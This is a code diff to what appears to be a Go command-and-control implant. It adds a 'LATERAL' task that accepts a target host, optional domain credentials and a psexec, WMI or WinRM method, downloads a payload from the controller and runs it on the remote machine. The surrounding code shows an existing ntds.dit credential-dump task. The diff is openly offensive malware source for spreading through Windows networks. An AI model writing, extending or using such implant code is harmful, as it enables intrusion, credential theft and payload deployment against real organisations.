@@ -944,6 +944,39 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, fmt.Sprintf("[+] ntds.dit dump to %s\n%s", outDir, out), errStr)
 
+	// ── Lateral movement ──────────────────────────────────────────────────────
+	// Args JSON: {"method":"psexec|wmi|winrm","host":"<ip>","payload":"<file>",
+	//             "svcname":"<opt>","user":"<opt DOMAIN\\user>","pass":"<opt>"}
+
+	case "LATERAL":
+		var la struct {
+			Method  string `json:"method"`
+			Host    string `json:"host"`
+			Payload string `json:"payload"`
+			SvcName string `json:"svcname"`
+			User    string `json:"user"`
+			Pass    string `json:"pass"`
+		}
+		if err := json.Unmarshal([]byte(task.Args), &la); err != nil {
+			t.sendResult(task.ID, "", "bad LATERAL args: "+err.Error())
+			return
+		}
+		if la.Host == "" || la.Payload == "" {
+			t.sendResult(task.ID, "", "LATERAL: host and payload are required")
+			return
+		}
+		payloadBytes, err := t.downloadFile(la.Payload)
+		if err != nil {
+			t.sendResult(task.ID, "", "LATERAL: download '"+la.Payload+"': "+err.Error())
+			return
+		}
+		out, err := runLateral(la.Method, la.Host, payloadBytes, la.SvcName, la.User, la.Pass)
+		errStr := ""
+		if err != nil {
+			errStr = err.Error()
+		}
+		t.sendResult(task.ID, out, errStr)
+
 	default:
 		t.sendResult(task.ID, "", "unknown task type: "+task.Type)
 	}
